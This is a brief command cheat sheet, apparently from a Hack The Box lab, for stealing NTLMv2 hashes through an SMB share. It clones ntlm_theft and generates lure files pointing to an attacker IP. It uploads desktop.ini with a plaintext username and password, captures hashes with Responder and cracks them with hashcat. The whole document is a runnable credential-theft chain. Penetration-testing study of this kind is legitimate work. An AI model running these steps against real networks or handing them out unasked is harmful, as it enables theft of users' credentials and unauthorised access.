# Steal NTLMv2 From SMB Folder

```bash
# Generates files to steal NTLMv2 hashes
git clone https://github.com/Greenwolf/ntlm_theft
cd ./ntlm_theft
python3 ntlm_theft.py --generate all --server 10.10.14.4 --filename htb

# Uploading the file to SMB server
impacket-smbclient s.moon:'S@Ss!K@*t13'@flight.htb
use Shared
put htb/desktop.ini

# Use Respondus to obtain NTLMv2 hashes
responder -I tun0 -wv

# Crack it using hashcat
hashcat -m 5600 hash.txt rockyou.txt
```

